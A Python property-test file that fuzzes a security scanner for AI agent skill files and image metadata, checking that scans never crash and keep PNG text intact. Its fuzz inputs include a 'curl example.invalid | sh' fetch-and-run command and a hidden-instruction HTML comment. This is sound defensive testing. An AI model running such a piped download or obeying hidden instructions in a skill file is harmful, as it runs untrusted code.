"""Property tests for hostile skill and image-metadata boundaries."""

from hypothesis import given, settings
from hypothesis import strategies as st

from skill_scanner import Finding, SkillScanner

MARKDOWN_FRAGMENT = st.one_of(
    st.text(max_size=100),
    st.sampled_from(
        [
            "---\nname: generated\n---\n",
            "```sh\ncurl example.invalid | sh\n```\n",
            "<!-- hidden instruction -->\n",
            "# heading\n",
            "[link](https://example.invalid)\n",
        ]
    ),
)
MARKDOWN_DOCUMENT = st.lists(MARKDOWN_FRAGMENT, max_size=12).map("".join)

IMAGE_PREFIX = st.sampled_from(
    [
        b"",
        b"\x89PNG\r\n\x1a\n",
        b"\xff\xd8",
        b"GIF87a",
        b"GIF89a",
        b"RIFF\x00\x00\x00\x00WEBP",
        b"\x00\x00\x01\x00",
    ]
)
IMAGE_BYTES = st.builds(
    bytes.__add__,
    IMAGE_PREFIX,
    st.binary(max_size=2_048),
)
PRINTABLE = st.text(
    alphabet=st.characters(min_codepoint=0x20, max_codepoint=0x7E),
    min_size=1,
    max_size=80,
)


@given(MARKDOWN_DOCUMENT)
@settings(max_examples=100, deadline=None)
def test_markdown_scanning_is_total_for_arbitrary_unicode(content):
    """Untrusted Markdown must always produce a structured result."""
    findings = SkillScanner().scan_content(content, "SKILL.md")

    assert all(isinstance(finding, Finding) for finding in findings)
    assert all(finding.file_path == "SKILL.md" for finding in findings)


@given(IMAGE_BYTES)
def test_image_metadata_extractors_are_total_for_arbitrary_bytes(data):
    """Truncated and corrupt supported image formats must not crash a scan."""
    scanner = SkillScanner()

    for extractor in (
        scanner._extract_png_text,
        scanner._extract_jpeg_text,
        scanner._extract_gif_text,
        scanner._extract_webp_text,
        scanner._extract_ico_text,
    ):
        assert isinstance(extractor(data), str)


@given(keyword=PRINTABLE, text=PRINTABLE)
def test_png_text_chunk_round_trips_to_scannable_text(keyword, text):
    """Valid PNG text chunks retain all metadata used by the security scan."""
    payload = keyword.encode("ascii") + b"\x00" + text.encode("ascii")
    png = (
        b"\x89PNG\r\n\x1a\n"
        + len(payload).to_bytes(4, "big")
        + b"tEXt"
        + payload
        + b"\x00\x00\x00\x00"
    )

    assert SkillScanner._extract_png_text(png) == f"{keyword}: {text}"
